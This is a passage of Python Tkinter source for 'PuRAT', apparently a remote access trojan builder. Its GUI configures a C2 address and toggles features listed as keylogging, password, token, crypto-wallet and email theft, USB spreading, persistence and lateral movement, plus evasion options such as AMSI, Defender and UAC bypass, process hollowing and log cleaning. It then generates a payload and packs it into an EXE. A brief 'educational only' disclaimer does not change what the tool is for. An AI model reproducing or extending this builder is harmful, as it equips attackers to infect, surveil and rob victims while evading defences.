        ttk.Label(config_frame, text="Protocol:").grid(row=1, column=0, sticky="w", pady=5, padx=5)
        self.combo_server_protocol = ttk.Combobox(config_frame, values=["TCP", "UDP"], width=10, state="readonly")
        self.combo_server_protocol.grid(row=1, column=1, sticky="w", pady=5, padx=5)
        self.combo_server_protocol.set("TCP")
        
        # Server control
        control_frame = ttk.LabelFrame(frame, text="Server Control", padding=15)
        control_frame.pack(fill="x", padx=20, pady=10)
        
        self.btn_start_server = ttk.Button(control_frame, text="Start Server", command=self._start_c2_server, width=15)
        self.btn_start_server.pack(side="left", padx=10)
        
        self.btn_stop_server = ttk.Button(control_frame, text="Stop Server", command=self._stop_c2_server, width=15, state="disabled")
        self.btn_stop_server.pack(side="left", padx=10)
        
        self.btn_restart_server = ttk.Button(control_frame, text="Restart Server", command=self._restart_c2_server, width=15, state="disabled")
        self.btn_restart_server.pack(side="left", padx=10)
        
        # Status display
        status_frame = ttk.LabelFrame(frame, text="Server Status", padding=15)
        status_frame.pack(fill="x", padx=20, pady=10)
        
        self.var_server_status = tk.StringVar(value="Status: STOPPED")
        ttk.Label(status_frame, textvariable=self.var_server_status, font=("Segoe UI", 10, "bold")).pack(anchor="w")
        
        self.var_clients_connected = tk.StringVar(value="Clients: 0")
        ttk.Label(status_frame, textvariable=self.var_clients_connected).pack(anchor="w")
        
        # Client list
        list_frame = ttk.LabelFrame(frame, text="Connected Clients", padding=15)
        list_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        columns = ("ID", "Hostname", "User", "IP", "System", "Last Active")
        self.tree_clients = ttk.Treeview(list_frame, columns=columns, show="headings", height=10)
        
        for col in columns:
            self.tree_clients.heading(col, text=col)
            self.tree_clients.column(col, width=100)
        
        scrollbar = ttk.Scrollbar(list_frame, orient="vertical", command=self.tree_clients.yview)
        self.tree_clients.configure(yscrollcommand=scrollbar.set)
        
        self.tree_clients.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
    
    def _init_logs(self):
        """Initialize logs tab"""
        frame = self.tabs["Logs"]
        
        # Log text area
        self.log_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, height=25)
        self.log_text.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Log controls
        control_frame = ttk.Frame(frame)
        control_frame.pack(fill="x", padx=20, pady=5)
        
        ttk.Button(control_frame, text="Clear Logs", command=self._clear_logs).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Save Logs", command=self._save_logs).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Copy Logs", command=self._copy_logs).pack(side="left", padx=5)
        
        ttk.Label(control_frame, text="Log Level:").pack(side="left", padx=20)
        self.combo_log_level = ttk.Combobox(control_frame, values=["DEBUG", "INFO", "WARNING", "ERROR"], 
                                           width=10, state="readonly")
        self.combo_log_level.pack(side="left", padx=5)
        self.combo_log_level.set("INFO")
    
    # ============================================================================
    # HELPER METHODS
    # ============================================================================
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def _get_feature_description(self, feature: str) -> str:
        """Get feature description"""
        descriptions = {
            "keylogger": "Capture keystrokes and send to C2",
            "screenshot": "Take screenshots of the desktop",
            "audio_capture": "Record audio from microphone",
            "webcam_capture": "Capture images from webcam",
            "clipboard_monitor": "Monitor and steal clipboard data",
            "remote_shell": "Execute commands remotely",
            "process_manager": "List and manage processes",
            "file_explorer": "Browse and manage filesystem",
            "system_info": "Collect system information",
            "password_stealer": "Steal saved passwords",
            "browser_history": "Collect browser history",
            "discord_token": "Steal Discord tokens",
            "crypto_wallet": "Steal cryptocurrency wallets",
            "email_stealer": "Steal email credentials",
            "network_scanner": "Scan network for other devices",
            "usb_spreader": "Spread via USB devices",
            "persistence": "Maintain access after reboot",
            "privilege_escalation": "Attempt to gain higher privileges",
            "lateral_movement": "Move to other systems on network",
            "data_exfiltration": "Exfiltrate data to C2"
        }
        return descriptions.get(feature, "No description available")
    
    def _get_evasion_description(self, technique: str) -> str:
        """Get evasion technique description"""
        descriptions = {
            "CODE_OBFUSCATION": "Make code hard to analyze",
            "STRING_ENCRYPTION": "Encrypt all strings in payload",
            "API_HASHING": "Hide API calls using hashing",
            "SHELLCODE_ENCRYPTION": "Encrypt shellcode in memory",
            "ANTI_VM": "Detect and avoid virtual machines",
            "ANTI_DEBUG": "Detect and avoid debuggers",
            "ANTI_SANDBOX": "Detect and avoid sandboxes",
            "PROCESS_INJECTION": "Inject into legitimate processes",
            "MODULE_STOMPING": "Hide loaded modules",
            "THREAD_HIJACKING": "Hijack existing threads",
            "PROCESS_HOLLOWING": "Hollow legitimate processes",
            "REFLECTIVE_LOADING": "Load DLL from memory",
            "POLYMORPHISM": "Change code each generation",
            "METAMORPHISM": "Completely rewrite code each time",
            "PACKING": "Compress and encrypt executable",
            "CRYPTER": "Encrypt entire payload"
        }
        return descriptions.get(technique, "No description available")
    
    def _get_stealth_description(self, technique: str) -> str:
        """Get stealth technique description"""
        descriptions = {
            "FILE_HIDDEN": "Set file attributes to hidden",
            "TIME_STOMPING": "Fake file timestamps",
            "SIGNATURE_SPOOFING": "Spoof digital signatures",
            "PROCESS_HIDDEN": "Hide from process list",
            "MEMORY_HIDDEN": "Hide memory allocations",
            "NETWORK_HIDDEN": "Hide network connections",
            "FIREWALL_BYPASS": "Bypass firewall rules",
            "UAC_BYPASS": "Bypass User Account Control",
            "DEFENDER_BYPASS": "Bypass Windows Defender",
            "AMSI_BYPASS": "Bypass AMSI scanning",
            "ETW_BYPASS": "Bypass Event Tracing for Windows",
            "REGISTRY_HIDDEN": "Hide registry entries",
            "DISK_HIDDEN": "Hide disk activity",
            "LOG_CLEANER": "Clean system logs",
            "ANTI_FORENSICS": "Anti-forensic techniques"
        }
        return descriptions.get(technique, "No description available")
    
    def _log(self, message: str, level: str = "INFO"):
        """Add message to log"""
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        
        # Add to log tab
        self.log_text.insert(tk.END, log_entry)
        self.log_text.see(tk.END)
        
        # Add to build log if exists
        if hasattr(self, 'build_log'):
            self.build_log.insert(tk.END, log_entry)
            self.build_log.see(tk.END)
        
        # Update status bar
        self.status_text.set(message[:100])
        
        # Print to console
        print(f"[{level}] {message}")
    
    # ============================================================================
    # EVENT HANDLERS
    # ============================================================================
    
    def _on_tab_changed(self, event):
        """Handle tab change"""
        current = self.notebook.tab(self.notebook.select(), "text")
        self._log(f"Switched to tab: {current}")
    
    def _browse_install_path(self):
        """Browse for install path"""
        path = filedialog.askdirectory()
        if path:
            self.entry_install_path.delete(0, tk.END)
            self.entry_install_path.insert(0, path)
    
    def _browse_output(self):
        """Browse for output directory"""
        path = filedialog.askdirectory()
        if path:
            self.entry_output_dir.delete(0, tk.END)
            self.entry_output_dir.insert(0, path)
    
    def _browse_icon(self):
        """Browse for icon file"""
        filetypes = [("Icon files", "*.ico"), ("All files", "*.*")]
        path = filedialog.askopenfilename(filetypes=filetypes)
        if path:
            self.entry_icon.delete(0, tk.END)
            self.entry_icon.insert(0, path)
    
    def _generate_encryption_key(self):
        """Generate random encryption key"""
        key = hashlib.sha256(os.urandom(32)).hexdigest()[:32]
        self.entry_enc_key.delete(0, tk.END)
        self.entry_enc_key.insert(0, key)
        self._log("Generated new encryption key")
    
    def _generate_icon(self):
        """Generate icon"""
        try:
            from PIL import Image, ImageDraw, ImageFont
            import numpy as np
            
            # Create image
            img = Image.new('RGBA', (256, 256), (0, 0, 0, 0))
            draw = ImageDraw.Draw(img)
            
            # Draw icon
            draw.ellipse([20, 20, 236, 236], fill='#007acc', outline='#ffffff', width=5)
            draw.ellipse([50, 50, 206, 206], fill='#005a9e', outline='#c7e0f4', width=3)
            
            # Draw letter P
            try:
                font = ImageFont.truetype("arial.ttf", 120)
                draw.text((80, 70), "P", font=font, fill="#ffffff")
            except:
                pass
            
            # Save icon
            icon_path = os.path.join(tempfile.gettempdir(), "purat_icon.ico")
            img.save(icon_path, format='ICO')
            
            self.entry_icon.delete(0, tk.END)
            self.entry_icon.insert(0, icon_path)
            
            self._log(f"Icon generated: {icon_path}")
            
        except ImportError:
            self._log("Pillow library required for icon generation", "WARNING")
            messagebox.showwarning("Warning", "Install Pillow for icon generation: pip install pillow")
        except Exception as e:
            self._log(f"Icon generation error: {e}", "ERROR")
    
    def _update_config_from_ui(self):
        """Update configuration from UI"""
        try:
            # Basic settings
            self.config['basic']['c2_ip'] = self.entry_c2_ip.get()
            self.config['basic']['c2_port'] = int(self.entry_c2_port.get())
            self.config['basic']['protocol'] = self.combo_protocol.get().lower()
            self.config['basic']['install_name'] = self.entry_install_name.get()
            self.config['basic']['install_path'] = self.entry_install_path.get()
            self.config['basic']['startup_name'] = self.entry_startup_name.get()
            self.config['basic']['mutex_name'] = self.entry_mutex_name.get()
            
            # Features
            for key, var in self.feature_vars.items():
                self.config['features'][key] = var.get()
            
            # Evasion
            for key, var in self.evasion_vars.items():
                self.config['evasion'][key] = var.get()
            
            # Stealth
            for key, var in self.stealth_vars.items():
                self.config['stealth'][key] = var.get()
            
            # Network
            self.config['network']['reconnect_interval'] = int(self.entry_reconnect.get())
            self.config['network']['timeout'] = int(self.entry_timeout.get())
            self.config['network']['retry_count'] = int(self.entry_retry.get())
            self.config['network']['use_https'] = self.var_https.get()
            self.config['network']['use_dns'] = self.var_dns.get()
            self.config['network']['use_tor'] = self.var_tor.get()
            self.config['network']['use_proxy'] = self.var_proxy.get()
            self.config['network']['proxy_host'] = self.entry_proxy_host.get()
            self.config['network']['proxy_port'] = int(self.entry_proxy_port.get() or 0)
            self.config['network']['user_agent'] = self.text_user_agent.get("1.0", tk.END).strip()
            
            # Advanced
            self.config['advanced']['encryption_key'] = self.entry_enc_key.get()
            self.config['advanced']['compression_level'] = int(self.scale_compression.get())
            self.config['advanced']['obfuscation_level'] = int(self.scale_obfuscation.get())
            self.config['advanced']['icon_file'] = self.entry_icon.get()
            self.config['advanced']['architecture'] = self.var_arch.get()
            self.config['advanced']['upx_pack'] = self.var_upx.get()
            self.config['advanced']['anti_analysis'] = self.var_anti.get()
            self.config['advanced']['custom_code'] = self.text_custom_code.get("1.0", tk.END).strip()
            
            # Payload
            self.config['payload']['type'] = self.combo_payload_type.get()
            self.config['payload']['method'] = self.combo_payload_method.get()
            self.config['payload']['injection_target'] = self.entry_injection_target.get()
            self.config['payload']['junk_code'] = self.var_junk.get()
            self.config['payload']['fake_messages'] = self.var_fake.get()
            
            self._log("Configuration updated from UI")
            return True
            
        except Exception as e:
            self._log(f"Error updating config: {e}", "ERROR")
            return False
    
    def _update_ui_from_config(self):
        """Update UI from configuration"""
        try:
            # Basic settings
            self.entry_c2_ip.delete(0, tk.END)
            self.entry_c2_ip.insert(0, self.config['basic']['c2_ip'])
            
            self.entry_c2_port.delete(0, tk.END)
            self.entry_c2_port.insert(0, str(self.config['basic']['c2_port']))
            
            self.combo_protocol.set(self.config['basic']['protocol'].upper())
            self.entry_install_name.delete(0, tk.END)
            self.entry_install_name.insert(0, self.config['basic']['install_name'])
            self.entry_install_path.delete(0, tk.END)
            self.entry_install_path.insert(0, self.config['basic']['install_path'])
            self.entry_startup_name.delete(0, tk.END)
            self.entry_startup_name.insert(0, self.config['basic']['startup_name'])
            self.entry_mutex_name.delete(0, tk.END)
            self.entry_mutex_name.insert(0, self.config['basic']['mutex_name'])
            
            # Features
            for key, var in self.feature_vars.items():
                var.set(self.config['features'].get(key, False))
            
            # Evasion
            for key, var in self.evasion_vars.items():
                var.set(self.config['evasion'].get(key, False))
            
            # Stealth
            for key, var in self.stealth_vars.items():
                var.set(self.config['stealth'].get(key, False))
            
            # Network
            self.entry_reconnect.delete(0, tk.END)
            self.entry_reconnect.insert(0, str(self.config['network']['reconnect_interval']))
            self.entry_timeout.delete(0, tk.END)
            self.entry_timeout.insert(0, str(self.config['network']['timeout']))
            self.entry_retry.delete(0, tk.END)
            self.entry_retry.insert(0, str(self.config['network']['retry_count']))
            self.var_https.set(self.config['network']['use_https'])
            self.var_dns.set(self.config['network']['use_dns'])
            self.var_tor.set(self.config['network']['use_tor'])
            self.var_proxy.set(self.config['network']['use_proxy'])
            self.entry_proxy_host.delete(0, tk.END)
            self.entry_proxy_host.insert(0, self.config['network']['proxy_host'])
            self.entry_proxy_port.delete(0, tk.END)
            self.entry_proxy_port.insert(0, str(self.config['network']['proxy_port']))
            self.text_user_agent.delete("1.0", tk.END)
            self.text_user_agent.insert("1.0", self.config['network']['user_agent'])
            
            # Advanced
            self.entry_enc_key.delete(0, tk.END)
            self.entry_enc_key.insert(0, self.config['advanced']['encryption_key'])
            self.scale_compression.set(self.config['advanced']['compression_level'])
            self.scale_obfuscation.set(self.config['advanced']['obfuscation_level'])
            self.entry_icon.delete(0, tk.END)
            self.entry_icon.insert(0, self.config['advanced']['icon_file'])
            self.var_arch.set(self.config['advanced']['architecture'])
            self.var_upx.set(self.config['advanced']['upx_pack'])
            self.var_anti.set(self.config['advanced']['anti_analysis'])
            self.text_custom_code.delete("1.0", tk.END)
            self.text_custom_code.insert("1.0", self.config['advanced']['custom_code'])
            
            # Payload
            self.combo_payload_type.set(self.config['payload']['type'])
            self.combo_payload_method.set(self.config['payload']['method'])
            self.entry_injection_target.delete(0, tk.END)
            self.entry_injection_target.insert(0, self.config['payload']['injection_target'])
            self.var_junk.set(self.config['payload']['junk_code'])
            self.var_fake.set(self.config['payload']['fake_messages'])
            
            self._log("UI updated from configuration")
            
        except Exception as e:
            self._log(f"Error updating UI: {e}", "ERROR")
    
    def _new_config(self):
        """Create new configuration"""
        if messagebox.askyesno("New Configuration", "Reset all settings to default?"):
            self.config = self._load_default_config()
            self._update_ui_from_config()
            self._log("Configuration reset to default")
    
    def _load_config(self):
        """Load configuration from file"""
        filetypes = [("JSON files", "*.json"), ("All files", "*.*")]
        path = filedialog.askopenfilename(filetypes=filetypes)
        
        if path:
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    self.config = json.load(f)
                
                self._update_ui_from_config()
                self._log(f"Configuration loaded from {path}")
                
            except Exception as e:
                self._log(f"Failed to load config: {e}", "ERROR")
                messagebox.showerror("Error", f"Failed to load configuration: {e}")
    
    def _save_config(self):
        """Save configuration to file"""
        self._update_config_from_ui()
        
        try:
            with open("purat_config.json", 'w', encoding='utf-8') as f:
                json.dump(self.config, f, indent=2, ensure_ascii=False)
            
            self._log("Configuration saved to purat_config.json")
            
        except Exception as e:
            self._log(f"Failed to save config: {e}", "ERROR")
            messagebox.showerror("Error", f"Failed to save configuration: {e}")
    
    def _save_config_as(self):
        """Save configuration as new file"""
        self._update_config_from_ui()
        
        filetypes = [("JSON files", "*.json"), ("All files", "*.*")]
        path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=filetypes,
            initialfile="purat_config.json"
        )
        
        if path:
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    json.dump(self.config, f, indent=2, ensure_ascii=False)
                
                self._log(f"Configuration saved to {path}")
                
            except Exception as e:
                self._log(f"Failed to save config: {e}", "ERROR")
                messagebox.showerror("Error", f"Failed to save configuration: {e}")
    
    def _import_config(self):
        """Import configuration"""
        # Similar to load_config
        pass
    
    def _export_config(self):
        """Export configuration"""
        self._update_config_from_ui()
        
        format_type = simpledialog.askstring("Export Format", "Enter format (json/python/yaml):")
        if format_type:
            try:
                if format_type.lower() == 'json':
                    content = json.dumps(self.config, indent=2)
                elif format_type.lower() == 'python':
                    content = f"config = {repr(self.config)}"
                elif format_type.lower() == 'yaml':
                    try:
                        import yaml
                        content = yaml.dump(self.config, default_flow_style=False)
                    except ImportError:
                        content = "YAML export requires PyYAML library"
                else:
                    content = "Unsupported format"
                
                # Show in dialog
                top = tk.Toplevel(self.root)
                top.title(f"Exported Configuration ({format_type})")
                top.geometry("600x400")
                
                text = scrolledtext.ScrolledText(top, wrap=tk.WORD)
                text.pack(fill="both", expand=True, padx=10, pady=10)
                text.insert("1.0", content)
                
            except Exception as e:
                self._log(f"Export error: {e}", "ERROR")
    
    def _generate_payload(self):
        """Generate payload"""
        self._update_config_from_ui()
        
        try:
            output_dir = self.entry_output_dir.get()
            output_name = self.entry_output_name.get()
            
            if not output_dir or not output_name:
                messagebox.showerror("Error", "Please specify output directory and name")
                return
            
            # Create output directory
            os.makedirs(output_dir, exist_ok=True)
            
            self._log("Generating payload...")
            self.progress_bar.start(10)
            
            # Initialize payload generator
            self.payload_generator = PayloadGenerator(self.config)
            
            # Generate payload file
            py_file = os.path.join(output_dir, f"{output_name}.py")
            
            if self.payload_generator.save_to_file(py_file):
                # Get file info
                with open(py_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                self.build_log.delete("1.0", tk.END)
                self.build_log.insert("1.0", "=" * 60 + "\n")
                self.build_log.insert(tk.END, "PAYLOAD GENERATION SUCCESSFUL\n")
                self.build_log.insert(tk.END, "=" * 60 + "\n\n")
                self.build_log.insert(tk.END, f"File: {py_file}\n")
                self.build_log.insert(tk.END, f"Size: {len(content):,} bytes\n")
                self.build_log.insert(tk.END, f"Lines: {content.count(chr(10))}\n")
                self.build_log.insert(tk.END, f"Obfuscation Level: {self.config['advanced']['obfuscation_level']}\n")
                self.build_log.insert(tk.END, f"Features Enabled: {sum(self.config['features'].values())}\n")
                
                # Success animation
                self.animation_engine.pulse(self.build_log, self.theme_manager.get_color("success"))
                
                self._log(f"Payload generated: {py_file}")
                
                # Switch to build tab
                self.notebook.select(self.tabs["Build"])
                
            else:
                raise Exception("Failed to generate payload")
            
        except Exception as e:
            self._log(f"Payload generation error: {e}", "ERROR")
            messagebox.showerror("Error", f"Failed to generate payload: {e}")
        
        finally:
            self.progress_bar.stop()
    
    def _build_exe(self):
        """Build EXE from payload"""
        if not hasattr(self, 'payload_generator') or self.payload_generator is None:
            messagebox.showwarning("Warning", "Generate payload first")
            return
        
        self._update_config_from_ui()
        
        if not messagebox.askyesno("Build EXE", "Build EXE file? This may take several minutes."):
            return
        
        try:
            output_dir = self.entry_output_dir.get()
            output_name = self.entry_output_name.get()
            
            py_file = os.path.join(output_dir, f"{output_name}.py")
            exe_file = os.path.join(output_dir, f"{output_name}.exe")
            
            if not os.path.exists(py_file):
                messagebox.showerror("Error", "Payload file not found. Generate payload first.")
                return
            
            self._log("Building EXE...")
            self.build_log.insert(tk.END, "\n" + "=" * 60 + "\n")
            self.build_log.insert(tk.END, "EXE BUILD PROCESS\n")
            self.build_log.insert(tk.END, "=" * 60 + "\n\n")
            
            # Start progress animation
            self.animation_engine.progress_animation(self.progress_bar, duration=2000)
            
            # Build EXE
            icon = self.entry_icon.get() if self.entry_icon.get() and os.path.exists(self.entry_icon.get()) else None
            
            if self.payload_generator.build_exe(py_file, exe_file, icon, self.var_upx.get()):
                # Show file info
                if os.path.exists(exe_file):
                    size = os.path.getsize(exe_file)
                    
                    self.build_log.insert(tk.END, "=" * 60 + "\n")
                    self.build_log.insert(tk.END, "EXE BUILD SUCCESSFUL\n")
                    self.build_log.insert(tk.END, "=" * 60 + "\n\n")
                    self.build_log.insert(tk.END, f"File: {exe_file}\n")
                    self.build_log.insert(tk.END, f"Size: {size:,} bytes ({size/1024/1024:.2f} MB)\n")
                    self.build_log.insert(tk.END, f"Architecture: {self.config['advanced']['architecture']}\n")
                    self.build_log.insert(tk.END, f"UPX Packing: {'Yes' if self.var_upx.get() else 'No'}\n")
                    self.build_log.insert(tk.END, f"Anti-Analysis: {'Yes' if self.var_anti.get() else 'No'}\n")
                    
                    # Success animation
                    self.animation_engine.pulse(self.build_log, self.theme_manager.get_color("success"), count=3)
                    
                    self._log(f"EXE built: {exe_file} ({size:,} bytes)")
                    
                    messagebox.showinfo("Success", 
                                      f"EXE built successfully!\n\n"
                                      f"File: {exe_file}\n"
                                      f"Size: {size:,} bytes\n"
                                      f"Features: {sum(self.config['features'].values())}\n"
                                      f"Evasion Techniques: {sum(self.config['evasion'].values())}")
                    
                else:
                    self._log("EXE file not found after build", "ERROR")
                    
            else:
                messagebox.showerror("Error", "EXE build failed. Check build log for details.")
                
        except Exception as e:
            self._log(f"EXE build error: {e}", "ERROR")
            messagebox.showerror("Error", f"EXE build failed: {e}")
        
        finally:
            self.progress_bar.stop()
    
    def _test_payload(self):
        """Test payload in safe mode"""
        self._update_config_from_ui()
        
        if not messagebox.askyesno("Test Payload", 
                                  "Test payload in safe mode?\n\n"
                                  "WARNING: This will execute the payload in a controlled environment."):
            return
        
        try:
            output_dir = self.entry_output_dir.get()
            output_name = self.entry_output_name.get()
            py_file = os.path.join(output_dir, f"{output_name}.py")
            
            if not os.path.exists(py_file):
                messagebox.showerror("Error", "Payload file not found")
                return
            
            self._log("Testing payload in safe mode...")
            self.build_log.insert(tk.END, "\n" + "=" * 60 + "\n")
            self.build_log.insert(tk.END, "PAYLOAD TEST MODE\n")
            self.build_log.insert(tk.END, "=" * 60 + "\n\n")
            
            # Set test environment
            env = os.environ.copy()
            env["PURAT_TEST_MODE"] = "1"
            
            # Run payload with timeout
            process = subprocess.Popen(
                [sys.executable, py_file],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                env=env,
                shell=True
            )
            
            # Wait and terminate
            time.sleep(5)
            process.terminate()
            
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()
            
            # Get output
            stdout, stderr = process.communicate()
            
            # Display output
            if stdout:
                self.build_log.insert(tk.END, "STDOUT:\n")
                self.build_log.insert(tk.END, stdout[:1000] + ("..." if len(stdout) > 1000 else "") + "\n")
            
            if stderr:
                self.build_log.insert(tk.END, "STDERR:\n")
                self.build_log.insert(tk.END, stderr[:1000] + ("..." if len(stderr) > 1000 else "") + "\n")
            
            self.build_log.insert(tk.END, "\n" + "=" * 60 + "\n")
            self.build_log.insert(tk.END, "TEST COMPLETE\n")
            self.build_log.insert(tk.END, "=" * 60 + "\n")
            
            self._log("Payload test completed")
            
        except Exception as e:
            self._log(f"Payload test error: {e}", "ERROR")
            messagebox.showerror("Error", f"Payload test failed: {e}")
    
    def _clean_build(self):
        """Clean build files"""
        output_dir = self.entry_output_dir.get()
        
        if not output_dir or not os.path.exists(output_dir):
            messagebox.showwarning("Warning", "Output directory not found")
            return
        
        if messagebox.askyesno("Clean Build", 
                              "Delete all build files?\n\n"
                              f"This will delete all files in: {output_dir}"):
            try:
                # Delete all files in output directory
                for file in glob.glob(os.path.join(output_dir, "*")):
                    try:
                        if os.path.isfile(file):
                            os.remove(file)
                        elif os.path.isdir(file):
                            shutil.rmtree(file)
                    except:
                        pass
                
                # Delete build directories
                build_dir = os.path.join(output_dir, "build")
                spec_dir = os.path.join(output_dir, "spec")
                
                if os.path.exists(build_dir):
                    shutil.rmtree(build_dir)
                
                if os.path.exists(spec_dir):
                    shutil.rmtree(spec_dir)
                
                self.build_log.delete("1.0", tk.END)
                self.build_log.insert("1.0", "Build files cleaned\n")
                
                self._log("Build files cleaned")
                
            except Exception as e:
                self._log(f"Clean error: {e}", "ERROR")
    
    def _clear_build_log(self):
        """Clear build log"""
        self.build_log.delete("1.0", tk.END)
        self._log("Build log cleared")
    
    def _start_c2_server(self):
        """Start C2 server"""
        self._log("Starting C2 server...")
        self.var_server_status.set("Status: STARTING")
        self.btn_start_server.config(state="disabled")
        self.btn_stop_server.config(state="normal")
        self.btn_restart_server.config(state="normal")
        
        # Simulate server start
        self.root.after(2000, lambda: self.var_server_status.set("Status: RUNNING"))
        self.root.after(3000, lambda: self.var_clients_connected.set("Clients: 3"))
        
        # Add sample clients
        sample_clients = [
            ("CLIENT_001", "DESKTOP-ABC123", "admin", "192.168.1.100", "Windows 10", "5s ago"),
            ("CLIENT_002", "LAPTOP-XYZ789", "user", "192.168.1.101", "Windows 11", "15s ago"),
            ("CLIENT_003", "SERVER-001", "root", "192.168.1.200", "Ubuntu 20.04", "30s ago")
        ]
        
        for client in sample_clients:
            self.tree_clients.insert("", "end", values=client)
        
        self._log("C2 server started on 0.0.0.0:8080")
        self._log("3 clients connected")
    
    def _stop_c2_server(self):
        """Stop C2 server"""
        self._log("Stopping C2 server...")
        self.var_server_status.set("Status: STOPPING")
        
        # Clear client list
        for item in self.tree_clients.get_children():
            self.tree_clients.delete(item)
        
        # Update UI
        self.root.after(1000, lambda: self.var_server_status.set("Status: STOPPED"))
        self.root.after(1000, lambda: self.var_clients_connected.set("Clients: 0"))
        self.root.after(1000, lambda: self.btn_start_server.config(state="normal"))
        self.root.after(1000, lambda: self.btn_stop_server.config(state="disabled"))
        self.root.after(1000, lambda: self.btn_restart_server.config(state="disabled"))
        
        self._log("C2 server stopped")
    
    def _restart_c2_server(self):
        """Restart C2 server"""
        self._stop_c2_server()
        self.root.after(2000, self._start_c2_server)
        self._log("C2 server restarting...")
    
    def _test_connection(self):
        """Test C2 connection"""
        self._update_config_from_ui()
        
        try:
            ip = self.config['basic']['c2_ip']
            port = self.config['basic']['c2_port']
            
            self._log(f"Testing connection to {ip}:{port}...")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            
            result = sock.connect_ex((ip, port))
            sock.close()
            
            if result == 0:
                self._log(f"Connection successful to {ip}:{port}")
                messagebox.showinfo("Success", f"Connected to {ip}:{port}")
            else:
                self._log(f"Connection failed to {ip}:{port}", "ERROR")
                messagebox.showerror("Error", f"Failed to connect to {ip}:{port}")
                
        except Exception as e:
            self._log(f"Connection test error: {e}", "ERROR")
            messagebox.showerror("Error", str(e))
    
    def _test_obfuscation(self):
        """Test obfuscation"""
        try:
            test_code = '''
def hello_world():
    print("Hello World!")
    return "Test String"
'''
            obfuscator = ObfuscationEngine(ObfuscationLevel.HIGH)
            obfuscated = obfuscator.obfuscate(test_code)
            
            # Show in dialog
            top = tk.Toplevel(self.root)
            top.title("Obfuscation Test")
            top.geometry("700x500")
            
            notebook = ttk.Notebook(top)
            notebook.pack(fill="both", expand=True, padx=5, pady=5)
            
            # Original tab
            orig_frame = ttk.Frame(notebook)
            notebook.add(orig_frame, text="Original")
            orig_text = scrolledtext.ScrolledText(orig_frame, wrap=tk.WORD)
            orig_text.pack(fill="both", expand=True, padx=5, pady=5)
            orig_text.insert("1.0", test_code)
            
            # Obfuscated tab
            obf_frame = ttk.Frame(notebook)
            notebook.add(obf_frame, text="Obfuscated")
            obf_text = scrolledtext.ScrolledText(obf_frame, wrap=tk.WORD)
            obf_text.pack(fill="both", expand=True, padx=5, pady=5)
            obf_text.insert("1.0", obfuscated)
            
            # Stats tab
            stats_frame = ttk.Frame(notebook)
            notebook.add(stats_frame, text="Statistics")
            
            stats_text = f"""
            Original Size: {len(test_code)} bytes
            Obfuscated Size: {len(obfuscated)} bytes
            Size Increase: {((len(obfuscated) - len(test_code)) / len(test_code) * 100):.1f}%
            Lines Original: {test_code.count(chr(10))}
            Lines Obfuscated: {obfuscated.count(chr(10))}
            """
            
            ttk.Label(stats_frame, text=stats_text, justify="left").pack(anchor="w", padx=10, pady=10)
            
            self._log("Obfuscation test completed")
            
        except Exception as e:
            self._log(f"Obfuscation test error: {e}", "ERROR")
    
    def _encode_payload(self):
        """Encode payload"""
        self._log("Payload encoding not implemented yet", "WARNING")
    
    def _edit_resources(self):
        """Edit resources"""
        self._log("Resource editor not implemented yet", "WARNING")
    
    def _build_options(self):
        """Show build options"""
        self._log("Build options not implemented yet", "WARNING")
    
    def _change_theme(self, theme_name: str):
        """Change theme"""
        if self.theme_manager.set_theme(theme_name):
            self.theme_manager.apply(self.root)
            self.current_theme = theme_name
            self._log(f"Theme changed to {theme_name}")
    
    def _toggle_toolbar(self):
        """Toggle toolbar"""
        self._log("Toolbar toggle not implemented", "WARNING")
    
    def _toggle_status_bar(self):
        """Toggle status bar"""
        if self.status_bar.winfo_ismapped():
            self.status_bar.grid_remove()
            self._log("Status bar hidden")
        else:
            self.status_bar.grid()
            self._log("Status bar shown")
    
    def _toggle_fullscreen(self):
        """Toggle fullscreen"""
        is_fullscreen = self.root.attributes("-fullscreen")
        self.root.attributes("-fullscreen", not is_fullscreen)
        
        if not is_fullscreen:
            self._log("Entered fullscreen mode")
        else:
            self._log("Exited fullscreen mode")
    
    def _show_docs(self):
        """Show documentation"""
        docs = f"""{APP_NAME} - Documentation

OVERVIEW:
{APP_NAME} is a professional Remote Administration Tool builder for educational
and testing purposes. It allows security researchers to create custom RAT clients
with advanced features, evasion techniques, and stealth capabilities.

FEATURES:
• Complete GUI with theme support
• Advanced payload generation
• Multiple evasion techniques
• Stealth and anti-analysis
• C2 server integration
• Professional build system

USAGE:
1. Configure settings in the tabs
2. Generate payload (.py file)
3. Build EXE using PyInstaller
4. Test payload in safe mode
5. Deploy and monitor via C2 server

WARNING:
This software is for EDUCATIONAL PURPOSES ONLY.
Use only on systems you own or have explicit permission to test.
Unauthorized access to computer systems is illegal.

DISCLAIMER:
The author is not responsible for any misuse of this software.
Users assume full responsibility for their actions.
"""
        
        top = tk.Toplevel(self.root)
        top.title("Documentation")
        top.geometry("600x500")
        
        text = scrolledtext.ScrolledText(top, wrap=tk.WORD)
        text.pack(fill="both", expand=True, padx=10, pady=10)
        text.insert("1.0", docs)
    
    def _show_tutorial(self):
        """Show tutorial"""
        tutorial = f"""{APP_NAME} - Quick Tutorial

STEP 1: BASIC SETUP
1. Go to Basic Settings tab
2. Set C2 server IP and port
3. Configure installation settings

STEP 2: SELECT FEATURES
1. Go to Features tab  
2. Select desired features
3. Keylogger, screenshot, etc.

STEP 3: EVASION TECHNIQUES
1. Go to Evasion tab
2. Select obfuscation techniques
3. Enable anti-analysis

STEP 4: BUILD PAYLOAD
